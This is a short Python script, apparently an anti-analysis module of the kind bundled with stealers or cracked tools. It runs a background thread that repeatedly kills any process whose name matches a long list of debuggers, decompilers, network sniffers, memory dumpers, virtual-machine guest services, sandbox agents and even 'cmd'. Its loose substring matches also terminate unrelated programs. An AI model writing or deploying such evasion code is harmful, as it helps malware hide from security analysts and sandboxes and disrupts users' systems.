# หีจัด
from time import sleep
import psutil
from threading import Thread

def checks():
    while True:
        for proc in psutil.process_iter():
            if any(procs in proc.name().lower() for procs in ['proxifier', 'graywolf', 'extremedumper', 'zed', 'exeinfope', 'dnspy', 'ilspy', 'titanhide', 'x32dbg', 'codecracker', 'simpleassembly', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 'process monitor', 'debug', 'reverse', 'simpleassemblyexplorer', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 'folderchangesview', 'fiddler', 'die', 'pizza', 'crack', 'strongod', 'ida -', 'brute', 'dump', 'StringDecryptor', 'wireshark', 'debugger', 'httpdebugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 'x64netdumper', 'petools', 'scyllahide', 'megadumper', 'reversal', 'ksdumper v1.1 - by equifox', 'dbgclr', 'HxD', 'monitor', 'peek', 'ollydbg', 'ksdumper', 'http', 'wpe pro', 'dbg', 'httpanalyzer', 'httpdebug', 'PhantOm', 'kgdb', 'james', 'x32_dbg', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 'de4dot', 'x64dbg', 'protection_id', 'charles', 'systemexplorer', 'pepper', 'hxd', 'procmon64', 'MegaDumper', 'ghidra', 'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 'mdb', 'checker', 'harmony', 'Protection_ID', 'x96dbg', 'systemexplorerservice', 'folder', 'mitmproxy', 'dbx', 'sniffer', 'regmon', 'diskmon', 'procmon', 'http', 'traffic', 'packet', 'debuger', 'dbg', 'ida', 'dumper', 'pestudio', 'hacker', 'vboxservice.exe','vboxtray.exe','vmtoolsd.exe','vmwaretray.exe','vmwareuser','VGAuthService.exe','vmacthlp.exe','vmsrvc.exe','vmusrvc.exe','prl_cc.exe','prl_tools.exe','xenservice.exe','qemu-ga.exe','joeboxcontrol.exe','joeboxserver.exe','joeboxserver.exe','cmd']):
                try:
                    print('delete')
                    proc.kill()
                except (psutil.AccessDenied, psutil.NoSuchProcess):
                    pass
                sleep(0)

def checksss():
    try:
        Thread(target=checks).start()
        return False
    except:
        pass

def check():
    if checksss():
        pass
    else:
        return
    

check()